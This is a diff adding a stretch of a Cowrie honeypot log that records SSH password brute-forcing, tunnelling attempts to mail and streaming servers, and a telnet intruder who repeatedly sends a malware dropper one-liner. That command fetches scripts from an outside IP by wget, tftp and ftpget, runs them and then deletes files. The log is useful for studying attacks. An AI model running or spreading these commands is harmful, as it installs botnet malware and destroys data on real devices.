@@ -4267,3 +4267,366 @@
 2017-04-30T00:38:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
 2017-04-30T00:38:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10167
 2017-04-30T00:38:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:01+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:01+0000 [SSHChannel None (53) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] remote eof
+2017-04-30T00:38:01+0000 [SSHChannel None (53) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] remote close
+2017-04-30T00:38:01+0000 [SSHChannel None (53) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] sending close 53
+2017-04-30T00:38:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] got channel 'direct-tcpip' request
+2017-04-30T00:38:01+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] direct-tcp connection request to 74.125.28.27:25 from localhost:5556
+2017-04-30T00:38:02+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:02+0000 [-] unauthorized login: 
+2017-04-30T00:38:02+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10168
+2017-04-30T00:38:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:03+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:04+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T00:38:04+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T00:38:04+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T00:38:04+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T00:38:04+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T00:38:04+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T00:38:04+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T00:38:04+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T00:38:04+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:04+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:04+0000 [-] unauthorized login: 
+2017-04-30T00:38:04+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T00:38:04+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T00:38:04+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T00:38:04+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T00:38:04+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T00:38:04+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T00:38:04+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T00:38:04+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T00:38:04+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T00:38:05+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T00:38:05+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T00:38:05+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T00:38:05+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T00:38:05+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:07+0000 [SSHChannel None (54) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] remote eof
+2017-04-30T00:38:07+0000 [SSHChannel None (54) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] remote close
+2017-04-30T00:38:07+0000 [SSHChannel None (54) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] sending close 54
+2017-04-30T00:38:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] got channel 'direct-tcpip' request
+2017-04-30T00:38:07+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] direct-tcp connection request to 74.125.128.27:25 from localhost:5556
+2017-04-30T00:38:11+0000 [CowrieTelnetTransport,29731,51.15.5.250] Connection lost after 127 seconds
+2017-04-30T00:38:13+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T00:38:13+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T00:38:13+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T00:38:14+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T00:38:14+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T00:38:14+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T00:38:14+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T00:38:14+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T00:38:14+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T00:38:14+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T00:38:14+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:19+0000 [CowrieTelnetTransport,29732,51.15.5.250] Connection lost after 127 seconds
+2017-04-30T00:38:23+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T00:38:23+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T00:38:23+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T00:38:23+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T00:38:23+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T00:38:23+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T00:38:23+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T00:38:23+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T00:38:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T00:38:23+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T00:38:23+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48928,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48928,195.22.127.83] login attempt: 10169
+2017-04-30T00:38:24+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48928,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:25+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48928,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:25+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] got channel 'direct-tcpip' request
+2017-04-30T00:38:25+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] direct-tcp connection request to 52.223.196.181:80 from localhost:5556
+2017-04-30T00:38:25+0000 [SSHChannel None (82) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] direct-tcp forward to 52.223.196.181:80 with data 'GET /v0/CugB6uMny3gU9frG7T1YARf1AuQh_Wfn83c-Zwl4T_lr7pL11rL38wR4LZKEyFKXbb6c37VPAKIr4oJEtSsdgqKnm3toIkcLC9a0c4V_9MaC9wvg28ozpmZbS04ERauslOQJ74QmRU4yLHrmCllHsIvj5BSFZPG10oaA1L6w15652EDpVMadIs6apM9LIgOMkY8cFKd7-wBk73lxnB3T3pTXJzDXtim0pwty_-GCACQedJt6BVh8nNSa5z3GbH_9OQf3uW4h8JfgG4pUrkvMiOGc5fDfGvdwR4otnMXoS1-Oe4u-NmhCWUv5QBIQ5wUsaq0a8OcKDEKICnZtFRoMuxpeYeEOf7Jyaz_D/index-live.m3u8 HTTP/1.1\r\nHost: video-edge-c2abf4.fra02.hls.ttvnw.net\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\n\r\n'
+2017-04-30T00:38:25+0000 [SSHChannel None (82) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] failed to connect: Connection refused
+2017-04-30T00:38:25+0000 [SSHChannel None (82) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] sending close 82
+2017-04-30T00:38:26+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:26+0000 [-] unauthorized login: 
+2017-04-30T00:38:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48928,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48928,195.22.127.83] login attempt: 10170
+2017-04-30T00:38:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48928,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:26+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48928,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:27+0000 [SSHChannel None (55) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] remote eof
+2017-04-30T00:38:27+0000 [SSHChannel None (55) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] remote close
+2017-04-30T00:38:27+0000 [SSHChannel None (55) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] sending close 55
+2017-04-30T00:38:27+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] got channel 'direct-tcpip' request
+2017-04-30T00:38:27+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] direct-tcp connection request to 74.125.28.27:25 from localhost:5556
+2017-04-30T00:38:27+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:27+0000 [-] unauthorized login: 
+2017-04-30T00:38:27+0000 [-] Disconnecting with error, code 14
+	reason: too many bad auths
+2017-04-30T00:38:27+0000 [HoneyPotSSHTransport,48928,195.22.127.83] connection lost
+2017-04-30T00:38:27+0000 [HoneyPotSSHTransport,48928,195.22.127.83] Connection lost after 82 seconds
+2017-04-30T00:38:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10171
+2017-04-30T00:38:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:30+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:30+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] got channel 'direct-tcpip' request
+2017-04-30T00:38:30+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] direct-tcp connection request to 52.223.196.106:80 from localhost:5556
+2017-04-30T00:38:30+0000 [SSHChannel None (83) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] direct-tcp forward to 52.223.196.106:80 with data 'GET /v0/CugB5F00jGe1oFgACExEpBWQz6JiQbQ4m3dZ7ftnVh6IiDQWQ151rpmeV-HH32_xx_TtGp5DggYLYPBcH4FnRRG4AGVG1Y0pLi4VJZhif3VWSpbR6GxWGsQZoC6vXGIQM4St5aN-O0F9_Wt3q1ibEmtf6RSxwmvzJI5U32wnC5pAczYRqVCD76Zcq_0_j7x1Eqnm7LxKJZ2W8XnLd0zzunyudcXx0lBiukgx2dU0YY41OX_queIE-UUvH6V0K8pqtqvxBFmfP1Eaaq-wrbWRcwXXzzLDDneid8WgZ96-iEEUlqWWKi4PevpNThIQclUPpEonsHnl3bxtgG736BoMjbXqGNYx10i_O4YY/index-live.m3u8 HTTP/1.1\r\nHost: video-edge-c2b5b4.fra02.hls.ttvnw.net\r\nAccept-Encoding: gzip,deflate\r\nConnection: close\r\n\r\n'
+2017-04-30T00:38:30+0000 [SSHChannel None (83) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] failed to connect: Connection refused
+2017-04-30T00:38:30+0000 [SSHChannel None (83) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48857,91.230.47.75] sending close 83
+2017-04-30T00:38:31+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:31+0000 [-] unauthorized login: 
+2017-04-30T00:38:31+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:31+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10172
+2017-04-30T00:38:31+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:32+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:32+0000 [SSHChannel None (56) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] remote eof
+2017-04-30T00:38:32+0000 [SSHChannel None (56) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] remote close
+2017-04-30T00:38:32+0000 [SSHChannel None (56) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48856,91.195.103.210] sending close 56
+2017-04-30T00:38:33+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T00:38:33+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T00:38:33+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:33+0000 [-] unauthorized login: 
+2017-04-30T00:38:33+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:33+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10173
+2017-04-30T00:38:33+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:34+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:34+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T00:38:34+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T00:38:34+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T00:38:34+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T00:38:34+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
+2017-04-30T00:38:34+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: wget http://198.71.80.133/cunty.sh
+2017-04-30T00:38:34+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: chmod 777 cunty.sh
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: sh cunty.sh
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: tftp 198.71.80.133 -c get shtftp1.sh
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp1.sh
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: sh shtftp1.sh
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: tftp -r shtftp2.sh -g 198.71.80.133
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: chmod 777 shtftp2.sh
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: sh shtftp2.sh
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] FTP connect failed: host=198.71.80.133, port=21, err=[Errno 111] Connection refused
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: sh ftp1.sh
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh
+2017-04-30T00:38:34+0000 [HTTPPageDownloader,client] Command found: rm -rf *
+2017-04-30T00:38:34+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://198.71.80.133/cunty.sh>
+2017-04-30T00:38:35+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:35+0000 [-] unauthorized login: 
+2017-04-30T00:38:35+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:35+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10174
+2017-04-30T00:38:35+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:35+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:36+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:36+0000 [-] unauthorized login: 
+2017-04-30T00:38:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10175
+2017-04-30T00:38:36+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:37+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:38+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:38+0000 [-] unauthorized login: 
+2017-04-30T00:38:38+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:38+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10176
+2017-04-30T00:38:38+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:39+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:40+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:40+0000 [-] unauthorized login: 
+2017-04-30T00:38:40+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] got channel 'direct-tcpip' request
+2017-04-30T00:38:40+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp connection request to 188.214.134.13:8888 from localhost:5556
+2017-04-30T00:38:40+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:40+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10177
+2017-04-30T00:38:40+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:40+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:40+0000 [SSHChannel None (22) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp forward to 188.214.134.13:8888 with data 'GET /v3/callerinfo/?geo=true HTTP/1.1\r\nHost: 188.214.134.13:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-04-30T00:38:40+0000 [SSHChannel None (22) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] failed to connect: Connection refused
+2017-04-30T00:38:40+0000 [SSHChannel None (22) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] sending close 22
+2017-04-30T00:38:41+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] got channel 'direct-tcpip' request
+2017-04-30T00:38:41+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp connection request to 188.214.134.13:8888 from localhost:5556
+2017-04-30T00:38:41+0000 [SSHChannel None (23) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] direct-tcp forward to 188.214.134.13:8888 with data 'GET /v3/callerinfo/?geo=true HTTP/1.1\r\nHost: 188.214.134.13:8888\r\nConnection: Keep-Alive\r\nUser-Agent: Apache-HttpClient/4.5.1 (Java/1.8.0_66)\r\nAccept-Encoding: gzip,deflate\r\n\r\n'
+2017-04-30T00:38:41+0000 [SSHChannel None (23) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] failed to connect: Connection refused
+2017-04-30T00:38:41+0000 [SSHChannel None (23) on SSHService 'ssh-connection' on HoneyPotSSHTransport,48891,91.230.47.81] sending close 23
+2017-04-30T00:38:41+0000 [-] 'root' failed auth 'password'
+2017-04-30T00:38:41+0000 [-] unauthorized login: 
+2017-04-30T00:38:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] 'root' trying auth 'password'
+2017-04-30T00:38:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt: 10178
+2017-04-30T00:38:41+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login return, expect: [support/support]
+2017-04-30T00:38:42+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,48930,195.22.127.83] login attempt [root/123456] failed
+2017-04-30T00:38:42+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: sh
+2017-04-30T00:38:42+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: sh 
+2017-04-30T00:38:42+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: shell
+2017-04-30T00:38:42+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command not found: shell
+2017-04-30T00:38:42+0000 [CowrieTelnetTransport,29522,183.206.163.192] CMD: cd /tmp || cd /var/; wget http://198.71.80.133/cunty.sh; chmod 777 cunty.sh; sh cunty.sh; tftp 198.71.80.133 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 198.71.80.133; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 198.71.80.133 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf cunty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *
+2017-04-30T00:38:42+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /tmp
+2017-04-30T00:38:42+0000 [CowrieTelnetTransport,29522,183.206.163.192] Command found: cd /var
